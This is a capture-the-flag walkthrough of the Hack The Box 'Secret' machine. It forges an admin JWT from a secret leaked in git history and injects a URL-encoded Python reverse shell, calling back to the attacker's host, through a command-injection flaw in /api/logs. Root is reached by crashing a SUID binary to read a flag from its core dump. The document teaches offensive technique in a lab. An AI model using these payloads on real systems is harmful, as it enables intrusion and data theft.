# Hack The Box - Secret
https://app.hackthebox.com/machines/Secret  

We start the machine from hack the box interface and get the ip address of the machine :
>10.10.11.120

![HTB Screen](screenshot1.png)

## Enumeration

Running a nmap scan we get the following results 

```
┌──(kali㉿kali)-[~]
└─$ nmap 10.10.11.120
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-11 13:52 EST
Nmap scan report for 10.10.11.120
Host is up (0.084s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp

Nmap done: 1 IP address (1 host up) scanned in 5.85 seconds
```

We observe that ssh, and http ports are open along with port 3000. This seems to be a port running with a user created service.

We open browser to see whats running on the http port and get this API documentation website.

![Website](screenshot2.png)

The Website contains documentation for an express-nodejs API application.


![Website](screenshot3.png)

This explains the port 3000 open in the nmap scan earlier. The port must be serving the api endpoint for this application.

The website even lets us download full source code of the api service.

![download](screenshot4.png)

The api seems to be a simple authentication appliation which got the following endpoints 

    /api/user/register
    /api/user/login
    /api/priv


## Attacking

To test the API commands i make requests to the endpoints by the following commands

```bash
┌──(kali㉿kali)-[~]
└─$ curl -H 'Content-Type: application/json' 
    -X POST 
    -d '{"name": "admin123",
        "email": "admin123@admin.com",
        "password": "admin123"  }' 
    10.10.11.120:3000/api/user/register
```

The response:
```
{"user":"admin123"}
```

Then trying to log in using the same credentials we used while creating an account 

```bash
┌──(kali㉿kali)-[~]
└─$ curl -H 'Content-Type: application/json' 
        -X POST -d '{"email":  "admin123@admin.com",
        "password": "admin123"}'
    10.10.11.120:3000/api/user/login  
```
The response:

```        
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MThkNmI4NzE3ODQyYTA0NTdjOGE0NmQiLCJuYW1lIjoiYWRtaW4xMjMiLCJlbWFpbCI6ImFkbWluMTIzQGFkbWluLmNvbSIsImlhdCI6MTYzNjY1ODMxMX0.nL2Uq6k8MWBw9qEReVED3WaWSeZaIRaZ5vwke8T9pJA  
```

The response seems to be a JWT (JSON web Token, encoded using a secret key)


We browse the source code we earlier downloaded from the website and we see its got a .git directory 

![directory](screenshot5.png)

Opening git logs to check history of the commits

![git log](screenshot6.png)

The second last commit has message 
> removed .env for security reasons

We explore files for that commit by 
```git 
git log -p -2
```
![git changes](screenshot7.png)

We get the TOKEN_SECRET in .env file which must be the secret key for the JWT encoding.

>-TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE

Further exploring private routes in the API server we see that for a user to be an admin the username should be 'theadmin'

![private.js](screenshot8.png)

We have the JWT secret signing key and we have the JWT token we obtained from the login step, which means we can tamper our JWT and change the name to 'theadmin' which will grant us access to private routes.

We can change the name in our JWT from the website https://jwt.io

![jwt tampering](screenshot9.png)

We copy the obtained JWT and sent it as a request header to the API endpoint 

```bash
┌──(kali㉿kali)-[~]
└─$ curl -H 'auth-token:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MThkNmI4NzE3ODQyYTA0NTdjOGE0NmQiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImFkbWluMTIzQGFkbWluLmNvbSIsImlhdCI6MTYzNjY1ODMxMX0.DIylbTPk5K12O1LN3SengBhq2tJ3ZXXoAk_CfjttR3k' -X GET 10.10.11.120:3000/api/priv
```
The Response 
```
{"creds":{"role":"admin","username":"theadmin","desc":"welcome back admin"}} 
```


We also see a private route named

    /api/logs

in the source code which takes a filename as a query and concatenates it to execute as a command on machine using javascript's 
> exec() function

![logs code](screenshot10.png)

The filename query can be used to inject malicious code (Remote Code Execution)

For this we will be using a python reverse shell and url encoding it to deliver it over web

### Reverse shell
We update our ip address and socket port
```bash
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.29",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

### URL Encoded reverse shell 
```bash
python3%20-c%20%27import%20socket%2Cos%2Cpty%3Bs%3Dsocket.socket(socket.AF_INET%2Csocket.SOCK_STREAM)%3Bs.connect((%2210.10.14.29%22%2C1234))%3Bos.dup2(s.fileno()%2C0)%3Bos.dup2(s.fileno()%2C1)%3Bos.dup2(s.fileno()%2C2)%3Bpty.spawn(%22%2Fbin%2Fsh%22)%27%0A
```

## Payload delivery

On attacker machine we first start a listener 

```bash
┌──(kali㉿kali)-[~/Desktop/local-web]
└─$ nc -nvlp 1234            
listening on [any] 1234 ...
```

Then we perform a curl request containing the payload 
```bash
┌──(kali㉿kali)-[~]
└─$ curl -H 'auth-token:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MThkNmI4NzE3ODQyYTA0NTdjOGE0NmQiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImFkbWluMTIzQGFkbWluLmNvbSIsImlhdCI6MTYzNjY1ODMxMX0.DIylbTPk5K12O1LN3SengBhq2tJ3ZXXoAk_CfjttR3k' -X GET '10.10.11.120:3000/api/logs?file=2;python3%20-c%20%27import%20socket%2Cos%2Cpty%3Bs%3Dsocket.socket(socket.AF_INET%2Csocket.SOCK_STREAM)%3Bs.connect((%2210.10.14.29%22%2C1234))%3Bos.dup2(s.fileno()%2C0)%3Bos.dup2(s.fileno()%2C1)%3Bos.dup2(s.fileno()%2C2)%3Bpty.spawn(%22%2Fbin%2Fsh%22)%27%0A'
```

We successfully get the reverse shell spawned at the attacker machine. 

```bash
┌──(kali㉿kali)-[~/Desktop/local-web]
└─$ nc -nvlp 1234            
listening on [any] 1234 ...
connect to [10.10.14.29] from (UNKNOWN) [10.10.11.120] 43308
$ whoami
whoami
dasith
$ ls
ls
index.js  node_modules  package-lock.json  routes  validations.js
model     package.json  public             src
$ cd ..
cd ..
$ ls
ls
local-web  user.txt
```

We finally get the user flag in user.txt file

# Privilege Escalation
## SUID Binaries
```bash
find / -type f -perm -u=s 2>/dev/null
```
Gives us an intresting file with setuid at /opt/count.
looking for the files in opt directory we are given the code for the binary too.
```bash
dasith@secret:/opt$ ls
code.c
count
valgrind.log
```
Exploring the code provided along the binary
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <dirent.h>
#include <sys/prctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <linux/limits.h>

void dircount(const char *path, char *summary)
{
    DIR *dir;
    char fullpath[PATH_MAX];
    struct dirent *ent;
    struct stat fstat;

    int tot = 0, regular_files = 0, directories = 0, symlinks = 0;

    if((dir = opendir(path)) == NULL)
    {
        printf("\nUnable to open directory.\n");
        exit(EXIT_FAILURE);
    }
    while ((ent = readdir(dir)) != NULL)
    {
        ++tot;
        strncpy(fullpath, path, PATH_MAX-NAME_MAX-1);
        strcat(fullpath, "/");
        strncat(fullpath, ent->d_name, strlen(ent->d_name));
        if (!lstat(fullpath, &fstat))
        {
            if(S_ISDIR(fstat.st_mode))
            {
                printf("d");
                ++directories;
            }
            else if(S_ISLNK(fstat.st_mode))
            {
                printf("l");
                ++symlinks;
            }
            else if(S_ISREG(fstat.st_mode))
            {
                printf("-");
                ++regular_files;
            }
            else printf("?");
            printf((fstat.st_mode & S_IRUSR) ? "r" : "-");
            printf((fstat.st_mode & S_IWUSR) ? "w" : "-");
            printf((fstat.st_mode & S_IXUSR) ? "x" : "-");
            printf((fstat.st_mode & S_IRGRP) ? "r" : "-");
            printf((fstat.st_mode & S_IWGRP) ? "w" : "-");
            printf((fstat.st_mode & S_IXGRP) ? "x" : "-");
            printf((fstat.st_mode & S_IROTH) ? "r" : "-");
            printf((fstat.st_mode & S_IWOTH) ? "w" : "-");
            printf((fstat.st_mode & S_IXOTH) ? "x" : "-");
        }
        else
        {
            printf("??????????");
        }
        printf ("\t%s\n", ent->d_name);
    }
    closedir(dir);

    snprintf(summary, 4096, "Total entries       = %d\nRegular files       = %d\nDirectories         = %d\nSymbolic links      = %d\n", tot, regular_files, directories, symlinks);
    printf("\n%s", summary);
}


void filecount(const char *path, char *summary)
{
    FILE *file;
    char ch;
    int characters, words, lines;

    file = fopen(path, "r");

    if (file == NULL)
    {
        printf("\nUnable to open file.\n");
        printf("Please check if file exists and you have read privilege.\n");
        exit(EXIT_FAILURE);
    }

    characters = words = lines = 0;
    while ((ch = fgetc(file)) != EOF)
    {
        characters++;
        if (ch == '\n' || ch == '\0')
            lines++;
        if (ch == ' ' || ch == '\t' || ch == '\n' || ch == '\0')
            words++;
    }

    if (characters > 0)
    {
        words++;
        lines++;
    }

    snprintf(summary, 256, "Total characters = %d\nTotal words      = %d\nTotal lines      = %d\n", characters, words, lines);
    printf("\n%s", summary);
}


int main()
{
    char path[100];
    int res;
    struct stat path_s;
    char summary[4096];

    printf("Enter source file/directory name: ");
    scanf("%99s", path);
    getchar();
    stat(path, &path_s);
    if(S_ISDIR(path_s.st_mode))
        dircount(path, summary);
    else
        filecount(path, summary);

    // drop privs to limit file write
    setuid(getuid());
    // Enable coredump generation
    prctl(PR_SET_DUMPABLE, 1);
    printf("Save results a file? [y/N]: ");
    res = getchar();
    if (res == 121 || res == 89) {
        printf("Path: ");
        scanf("%99s", path);
        FILE *fp = fopen(path, "a");
        if (fp != NULL) {
            fputs(summary, fp);
            fclose(fp);
        } else {
            printf("Could not open %s for writing\n", path);
        }
    }

    return 0;
}
```
Looking at the source code the write functionality looks intresting but the problem is that we cannot write in privilleged mode and the content of file so there is no possible way we can write something to high-privileged file or see the content of higher privileged file.

If we crash the execution of the code after it read a root file. We might be able to read the root flag from the memory dump of the crash logs.

Most of the time if we crash the process in between the report is most of the time saved in /var/crash in linux distro.

For this we need 2 shells
1 -> To run the count binary
2 -> To create crash
### Shell 1
```bash
dasith@secret:/$ cd /opt
dasith@secret:/opt$ ./count -p
/root/root.txt
y
```
Now let's go to shell 2 to crash the binary
### Shell 2
```bash
dasith@secret:/opt$ ps -aux | grep count
root         812  0.0  0.1 235664  7428 ?        Ssl  10:14   0:00 /usr/lib/accountsservice/accounts-daemon
dasith     67786  0.0  0.0   2488   580 ?        S    13:25   0:00 ./count -p
dasith     67788  0.0  0.0   6432   736 ?        S    13:25   0:00 grep --color=auto count
```
Now kill the process with the PID corresponding to ./count -p
```bash
dasith@secret:/opt$ kill -BUS 67786
```
Now you can check the shell1 if the process is been crashed.
### Shell 1
```bash
dasith@secret:/opt$ ./count -p
/root/root.txt
y
bash: [67393: 3 (255)] tcsetattr: Inappropriate ioctl for device
```
Indeed we have crashed the process so lets check the /var/crash for the report.
```bash
dasith@secret:/opt$ cd /var/crash
dasith@secret:/opt$ ls -al
total 88
drwxrwxrwt  2 root   root    4096 Oct 31 13:24 .
drwxr-xr-x 14 root   root    4096 Aug 13 05:12 ..
-rw-r-----  1 root   root   27203 Oct  6 18:01 _opt_count.0.crash
-rw-r-----  1 dasith dasith 28127 Oct 31 13:24 _opt_count.1000.crash
-rw-r-----  1 root   root   24048 Oct  5 14:24 _opt_countzz.0.crash
dasith@secret:/opt$ mkdir /tmp/oopsie
dasith@secret:/var/crash$ apport-unpack _opt_count.1000.crash /tmp/oopsie
dasith@secret:/var/crash$ cd /tmp/oopsie
dasith@secret:/tmp/oopsie$ ls -al
total 444
drwxr-xr-x  2 dasith dasith   4096 Oct 31 13:31 .
drwxrwxrwt 16 root   root     4096 Oct 31 13:30 ..
-rw-r--r--  1 dasith dasith      5 Oct 31 13:31 Architecture
-rw-r--r--  1 dasith dasith 380928 Oct 31 13:31 CoreDump
-rw-r--r--  1 dasith dasith      1 Oct 31 13:31 CrashCounter
-rw-r--r--  1 dasith dasith     24 Oct 31 13:31 Date
-rw-r--r--  1 dasith dasith     12 Oct 31 13:31 DistroRelease
-rw-r--r--  1 dasith dasith     10 Oct 31 13:31 ExecutablePath
-rw-r--r--  1 dasith dasith     10 Oct 31 13:31 ExecutableTimestamp
-rw-r--r--  1 dasith dasith      2 Oct 31 13:31 _LogindSession
-rw-r--r--  1 dasith dasith      5 Oct 31 13:31 ProblemType
-rw-r--r--  1 dasith dasith      7 Oct 31 13:31 ProcCmdline
-rw-r--r--  1 dasith dasith      4 Oct 31 13:31 ProcCwd
-rw-r--r--  1 dasith dasith     97 Oct 31 13:31 ProcEnviron
-rw-r--r--  1 dasith dasith   2144 Oct 31 13:31 ProcMaps
-rw-r--r--  1 dasith dasith   1342 Oct 31 13:31 ProcStatus
-rw-r--r--  1 dasith dasith      1 Oct 31 13:31 Signal
-rw-r--r--  1 dasith dasith     29 Oct 31 13:31 Uname
-rw-r--r--  1 dasith dasith      3 Oct 31 13:31 UserGroups
```
We have the coredump file so let's check it out using strings or else it will give out gibberish output.
```bash
dasith@secret:/tmp/oopsie$ strings CoreDump
Path: esults a file? [y/N]: words      = 2
Total lines      = 2
oot/root.txt
<----FLAG---->
```
We get the root flag from here